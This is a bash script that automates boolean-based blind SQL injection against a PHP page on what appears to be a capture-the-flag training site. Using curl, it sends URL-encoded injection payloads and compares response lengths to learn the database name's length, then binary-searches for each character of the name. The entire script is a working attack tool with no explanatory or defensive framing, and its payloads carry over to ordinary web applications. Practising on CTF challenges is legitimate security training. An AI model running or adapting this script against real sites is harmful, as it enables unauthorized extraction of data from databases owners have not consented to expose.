#!/bin/bash
input_url="http://ctf5.shiyanbar.com/web/index_3.php?id=1"
sqli_getnum="%27+and+length%28database%28%29%29%3D"
sqli_getchar_eq="%27+and+ascii%28substr%28%28select+database%28%29%29%2C"$i"%2C1%29%29%3d"
sqli_getchar_less="%27+and+ascii%28substr%28%28select+database%28%29%29%2C"$i"%2C1%29%29%3c"
sqli_getchar_more="%27+and+ascii%28substr%28%28select+database%28%29%29%2C"$i"%2C1%29%29%3e"
pass_recv=`curl -s $input_url`
pass_recv_length=${#pass_recv}

#db_name_length max is 9
for((db_name_length=1;db_name_length<10;db_name_length++))
do
    target_url=$input_url$sqli_getnum$db_name_length"%23"
    recv=`curl -s $target_url`
    recv_length=${#recv}
    if [ $recv_length -eq $pass_recv_length ]
    then
        echo "db_name_length="$db_name_length
        break
    fi
done
# 1-true 2-false $1-input_url $2-sqli_getchar $3-char
judge(){
    target_url=$1$2$3"%23"
    recv=`curl -s $target_url`
    recv_length=${#recv}
    if [ $recv_length -eq $pass_recv_length ]
    then
        return 1
    else
        return 2
    fi
}

#get db_name
for((i=1;i<=$db_name_length;i++))
do
    ascii_char=48
    sqli_getchar_eq="%27+and+ascii%28substr%28%28select+database%28%29%29%2C"$i"%2C1%29%29%3d"
    sqli_getchar_less="%27+and+ascii%28substr%28%28select+database%28%29%29%2C"$i"%2C1%29%29%3c"
    sqli_getchar_more="%27+and+ascii%28substr%28%28select+database%28%29%29%2C"$i"%2C1%29%29%3e"
    #judge 0 or a or A
    judge $input_url $sqli_getchar_more 64
    if [ $? -eq 1 ]
    then
        judge $input_url $sqli_getchar_more 96
        if [ $? -eq 1 ]
        then
            ascii_char=97
        else
            ascii_char=65
        fi
    fi
    #init array
    if [ $ascii_char -eq 48 ]
    then
        for((j=0;j<10;j++,ascii_char++))
        do
            array[$j]=$ascii_char
        done
        right=9
    else
        for((j=0;j<26;j++,ascii_char++))
        do
            array[$j]=$ascii_char
        done
        right=25
    fi
    left=0
    result=-1
    #find char
    while [ $left -le $right ]
    do
        mid=$[($left + $right) / 2]
        judge $input_url $sqli_getchar_more ${array[$mid]}
        if [ $? -eq 1 ]
        then
            left=$[$mid+1]
        else
            judge $input_url $sqli_getchar_less ${array[$mid]}
            if [ $? -eq 1 ]
            then
                right=$[$mid-1]
            else
                result=${array[$mid]}
                break
            fi
        fi
    done
    echo $result
done

